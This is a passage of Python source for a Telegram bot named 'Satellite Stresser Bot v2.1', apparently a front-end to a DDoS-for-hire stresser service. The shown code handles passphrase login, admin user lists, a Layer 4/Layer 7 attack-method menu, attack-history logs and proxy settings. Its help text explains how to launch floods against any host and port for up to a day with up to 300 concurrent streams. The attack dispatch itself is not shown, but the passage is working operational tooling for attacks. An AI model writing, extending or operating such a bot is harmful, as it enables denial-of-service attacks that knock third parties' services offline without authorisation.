    if not ACCESS_PASSPHRASE:
        await update.message.reply_text("No passphrase is configured for this bot.")
        return

    args = context.args
    if not args:
        await update.message.reply_text("Usage: /auth `<passphrase>`", parse_mode="Markdown")
        return

    provided = " ".join(args)
    if provided == ACCESS_PASSPHRASE:
        context.user_data["authenticated"] = True
        # Set expiry (24 hours)
        context.user_data["auth_expiry"] = time.time() + 86400
        await update.message.reply_text("✅ Authenticated successfully! You can now use /attack.")
    else:
        await update.message.reply_text("❌ Invalid passphrase.")


async def methods_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /methods command."""
    auth_ok, msg = await check_auth(update)
    if not auth_ok:
        await update.message.reply_text(f"❌ {msg}")
        return

    text = "📋 *Available Attack Methods*\n\n"
    for layer_name, methods in ATTACK_METHODS.items():
        layer_icon = "🌐" if layer_name == "layer4" else "🕸️"
        layer_title = "Layer 4 (Transport)" if layer_name == "layer4" else "Layer 7 (Application)"
        text += f"*{layer_icon} {layer_title}:*\n"
        for m in methods:
            text += f"  • `{m['name']}` — {m['desc']}\n"
        text += "\n"
    text += "Usage: `/attack <host> <port> <time> <method>`"
    await update.message.reply_text(text, parse_mode="Markdown")


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /status command."""
    auth_ok, msg = await check_auth(update)
    if not auth_ok:
        await update.message.reply_text(f"❌ {msg}")
        return

    msg = await update.message.reply_text("🔄 Checking status...")

    results = []
    
    # Check website
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(BASE_URL, timeout=10, ssl=create_ssl_context()) as resp:
                if resp.status == 200:
                    results.append(f"🌐 Website: ✅ Online (HTTP {resp.status})")
                else:
                    results.append(f"🌐 Website: ⚠️ HTTP {resp.status}")
    except Exception as e:
        results.append(f"🌐 Website: ❌ {str(e)[:50]}")

    # Check API
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{API_BASE}/health", timeout=10, ssl=create_ssl_context()) as resp:
                if resp.status == 200:
                    results.append(f"📡 API: ✅ Online")
                else:
                    results.append(f"📡 API: ⚠️ HTTP {resp.status}")
    except Exception:
        results.append(f"📡 API: ❌ No /health endpoint (may be normal)")

    # Check cache status
    cache_status = "Active" if WORKING_PATTERN_CACHE["pattern"] else "Empty"
    results.append(f"💾 Cache: {cache_status}")

    await msg.edit_text("\n".join(["📊 *Status Report*"] + results), parse_mode="Markdown")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /help command."""
    auth_ok, msg = await check_auth(update)
    if not auth_ok:
        await update.message.reply_text(f"❌ {msg}")
        return

    await update.message.reply_text(
        "📖 *Help — Satellite Stresser Bot v2.1*\n\n"
        "**Usage:**\n"
        "`/attack <host> <port> <time> <method> [concurrents]`\n\n"
        "**Example:**\n"
        "`/attack 192.168.1.1 80 60 UDP-BIG`\n"
        "`/attack example.com 443 120 HTTP-CONNECT 5`\n\n"
        "**Parameters:**\n"
        "• host: IP address or domain name\n"
        "• port: 1-65535\n"
        "• time: 10-86400 seconds\n"
        "• method: See /methods\n"
        "• concurrents: 1-300 (optional, default: 1)\n\n"
        "**Rate limits:**\n"
        f"• User cooldown: {COOLDOWN_SECONDS}s between attacks\n"
        "• API rate: 60 requests/minute\n\n"
        "**Security:**\n"
        "• All credentials stored via environment variables\n"
        "• Optional passphrase authentication\n"
        "• Logs sanitized and rotated automatically\n"
        "• Restricted chat groups supported",
        parse_mode="Markdown",
    )


async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /logs command — show recent attack history."""
    auth_ok, msg = await check_auth(update)
    if not auth_ok:
        await update.message.reply_text(f"❌ {msg}")
        return

    # Check if user is admin (first authorized user)
    user = update.effective_user
    if AUTHORIZED_USERS and user.id != AUTHORIZED_USERS[0]:
        await update.message.reply_text("❌ Only the primary admin can view logs.")
        return

    try:
        if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
            await update.message.reply_text("📊 No attack logs found.")
            return

        # Read last 10 entries
        entries = []
        with open(LOG_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if line:
                    try:
                        entry = json.loads(line)
                        entries.append(entry)
                    except json.JSONDecodeError:
                        continue

        # Show last 10
        last_entries = entries[-10:]
        
        text = "📊 *Recent Attack Logs (last 10)*\n\n"
        for entry in reversed(last_entries):
            status = "✅" if entry.get("success") else "❌"
            ts = entry.get("timestamp", "unknown")[:19]
            target = entry.get("target_host", "?") 
            port = entry.get("target_port", "?")
            method = entry.get("method", "?")
            duration = entry.get("duration", "?")
            rid = entry.get("request_id", "?")[-8:]  # Last
            text += f"{status} `{rid}` {target}:{port} | {method} | {duration}s | {ts}\n"

        if len(text) > 4000:
            text = text[:4000] + "\n\n...truncated"

        await update.message.reply_text(text, parse_mode="Markdown")

    except Exception as e:
        logger.error(f"Logs error: {e}")
        await update.message.reply_text(f"❌ Error reading logs: {str(e)[:100]}")


async def adduser_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /adduser command — add authorized user (admin only)."""
    auth_ok, msg = await check_auth(update)
    if not auth_ok:
        await update.message.reply_text(f"❌ {msg}")
        return

    user = update.effective_user
    if AUTHORIZED_USERS and user.id != AUTHORIZED_USERS[0]:
        await update.message.reply_text("❌ Only the primary admin can add users.")
        return

    args = context.args
    if not args:
        await update.message.reply_text("Usage: /adduser `<telegram_user_id>`", parse_mode="Markdown")
        return

    try:
        new_user_id = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")
        return

    if new_user_id in AUTHORIZED_USERS:
        await update.message.reply_text("ℹ️ User is already authorized.")
        return

    AUTHORIZED_USERS.append(new_user_id)
    await update.message.reply_text(f"✅ User `{new_user_id}` added to authorized list.", parse_mode="Markdown")
    logger.info(f"Admin {user.id} added user {new_user_id} to authorized list")


async def removeuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /removeuser command — remove authorized user (admin only)."""
    auth_ok, msg = await check_auth(update)
    if not auth_ok:
        await update.message.reply_text(f"❌ {msg}")
        return

    user = update.effective_user
    if AUTHORIZED_USERS and user.id != AUTHORIZED_USERS[0]:
        await update.message.reply_text("❌ Only the primary admin can remove users.")
        return

    args = context.args
    if not args:
        await update.message.reply_text("Usage: /removeuser `<telegram_user_id>`", parse_mode="Markdown")
        return

    try:
        remove_id = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")
        return

    if remove_id not in AUTHORIZED_USERS:
        await update.message.reply_text("ℹ️ User is not in the authorized list.")
        return

    AUTHORIZED_USERS.remove(remove_id)
    await update.message.reply_text(f"✅ User `{remove_id}` removed from authorized list.", parse_mode="Markdown")
    logger.info(f"Admin {user.id} removed user {remove_id} from authorized list")


async def listusers_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /listusers command — list authorized users (admin only)."""
    auth_ok, msg = await check_auth(update)
    if not auth_ok:
        await update.message.reply_text(f"❌ {msg}")
        return

    user = update.effective_user
    if AUTHORIZED_USERS and user.id != AUTHORIZED_USERS[0]:
        await update.message.reply_text("❌ Only the primary admin can list users.")
        return

    if not AUTHORIZED_USERS:
        await update.message.reply_text("ℹ️ No authorized users configured (all users allowed).")
        return

    text = "📋 *Authorized Users*\n\n"
    for uid in AUTHORIZED_USERS:
        is_self = "👑 " if uid == user.id else "  "
        text += f"{is_self}`{uid}`\n"

    await update.message.reply_text(text, parse_mode="Markdown")


# =============================================================================
# CALLBACK HANDLERS
# =============================================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle inline keyboard callbacks."""
    query = update.callback_query
    await query.answer()

    auth_ok, msg = await check_auth(update)
    if not auth_ok:
        await query.edit_message_text(f"❌ {msg}")
        return

    data = query.data

    if data == "menu_attack":
        await query.edit_message_text(
            "🚀 *Start an Attack*\n\n"
            "Use the command:\n"
            "`/attack <host> <port> <time> <method> [concurrents]`\n\n"
            "Example:\n"
            "`/attack example.com 443 60 HTTP-CONNECT 3`",
            parse_mode="Markdown",
        )

    elif data == "menu_methods":
        text = "📋 *Available Attack Methods*\n\n"
        for layer_name, methods in ATTACK_METHODS.items():
            layer_icon = "🌐" if layer_name == "layer4" else "🕸️"
            layer_title = "Layer 4" if layer_name == "layer4" else "Layer 7"
            text += f"*{layer_icon} {layer_title}:*\n"
            for m in methods:
                text += f"  • `{m['name']}`\n"
            text += "\n"
        await query.edit_message_text(text, parse_mode="Markdown")

    elif data == "menu_stats":
        results = []
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(BASE_URL, timeout=10, ssl=create_ssl_context()) as resp:
                    results.append(f"🌐 Website: {'✅' if resp.status == 200 else '⚠️'} HTTP {resp.status}")
        except Exception:
            results.append("🌐 Website: ❌ Unreachable")
        
        cache_status = "Active" if WORKING_PATTERN_CACHE["pattern"] else "Empty"
        results.append(f"💾 Pattern Cache: {cache_status}")
        results.append(f"👥 Authorized Users: {len(AUTHORIZED_USERS)}")
        
        await query.edit_message_text(
            "📊 *Status*\n\n" + "\n".join(results),
            parse_mode="Markdown",
        )

    elif data == "menu_help":
        await query.edit_message_text(
            "📖 *Help*\n\n"
            "**Commands:**\n"
            "/attack — Launch an attack\n"
            "/methods — List methods\n"
            "/status — Check API status\n"
            "/help — Show this help\n"
            "/auth — Authenticate with passphrase\n"
            "/logs — View attack history (admin)\n\n"
            "**Rate limits:**\n"
            f"• {COOLDOWN_SECONDS}s cooldown between attacks\n"
            "• 60 API calls/minute global",
            parse_mode="Markdown",
        )


# =============================================================================
# ERROR HANDLER
# =============================================================================

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle errors in the bot."""
    logger.error(f"Update {update.update_id} caused error: {context.error}", exc_info=context.error)
    
    try:
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "❌ An internal error occurred. The admin has been notified."
            )
    except Exception:
        pass


# =============================================================================
# GRACEFUL SHUTDOWN
# =============================================================================

class GracefulShutdown:
    def __init__(self):
        self._shutdown_event = asyncio.Event()
        self._tasks: Set[asyncio.Task] = set()

    async def shutdown(self, app: Application, signal_num: int = None) -> None:
        """Perform graceful shutdown."""
        sig_name = signal.Signals(signal_num).name if signal_num else "Unknown"
        logger.info(f"🛑 Received {sig_name}. Shutting down gracefully...")
        self._shutdown_event.set()

        # Cancel all pending tasks
        for task in self._tasks:
            task.cancel()
        
        if self._tasks:
            await asyncio.gather(*self._tasks, return_exceptions=True)

        # Close HTTP session
        await async_session.close()
        
        # Stop the bot application
        await app.stop()
        await app.shutdown()
        
        logger.info("👋 Shutdown complete.")

    def track_task(self, task: asyncio.Task) -> None:
        """Track a task for cleanup."""
        self._tasks.add(task)
        task.add_done_callback(self._tasks.discard)


shutdown_handler = GracefulShutdown()


async def post_init(app: Application) -> None:
    """Run after bot initialization."""
    logger.info("🤖 Bot initialized successfully")
    
    # Authenticate with API
    if os.getenv("API_ACCESS_TOKEN"):
        auth_result = await async_session.authenticate()
        if auth_result:
            logger.info("✅ API authentication successful")
        else:
            logger.warning("⚠️ API authentication may have issues")


async def post_shutdown(app: Application) -> None:
    """Run after bot shutdown."""
    logger.info("🔌 Bot shutdown complete")


# =============================================================================
# MAIN
# =============================================================================

def main() -> None:
    """Main entry point."""
    # Validate configuration
    validate_config()
    
    # Setup secure logging
    setup_logging()
    
    logger.info("=" * 50)
    logger.info("🚀 Satellite Stresser Bot v2.1 — Starting")
    logger.info("=" * 50)
    
    # Log configuration summary (no secrets)
    logger.info(f"  Base URL: {BASE_URL}")
    logger.info(f"  SSL Verify: {SSL_VERIFY}")
    logger.info(f"  Proxy Enabled: {PROXY_ENABLED} ({len(PROXY_LIST)} proxies)")
    logger.info(f"  Auth Users: {len(AUTHORIZED_USERS)} configured")
    logger.info(f"  Passphrase Auth: {'Yes' if ACCESS_PASSPHRASE else 'No'}")
    logger.info(f"  Restricted Chats: {len(ALLOWED_CHAT_IDS)}")
    logger.info(f"  Log Dir: {LOGS_DIR}")
    logger.info(f"  Max Log Size: {LOG_MAX_BYTES} bytes")
    
    # Create bot application
    token = os.getenv("TELEGRAM_BOT_TOKEN", "")
    application = (
        Application.builder()
        .token(token)
        .post_init(post_init)
        .post_shutdown(post_shutdown)
        .build()
    )

    # Register command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("auth", auth_command))
    application.add_handler(CommandHandler("methods", methods_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("logs", logs_command))
    application.add_handler(CommandHandler("adduser", adduser_command))
    application.add_handler(CommandHandler("removeuser", removeuser_command))
    application.add_handler(CommandHandler("listusers", listusers_command))
    
    # Register callback handler for inline keyboards
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Register error handler
    application.add_error_handler(error_handler)

    # Set up signal handlers for graceful shutdown
    loop = asyncio.get_event_loop()
    
    signals = (signal.SIGINT, signal.SIGTERM)
    for sig in signals:
        try:
            loop.add_signal_handler(
                sig,
                lambda s=sig: asyncio.create_task(
                    shutdown_handler.shutdown(application, s)
                ),
            )
        except (NotImplementedError, ValueError):
            # Windows doesn't support add_signal_handler
            pass

    logger.info("✅ Bot is running. Press Ctrl+C to stop.")
    
    # Start polling
    application.run_polling(allowed_updates=Update.ALL_TYPES, stop_signals=None)


if __name__ == "__main__":
    main()
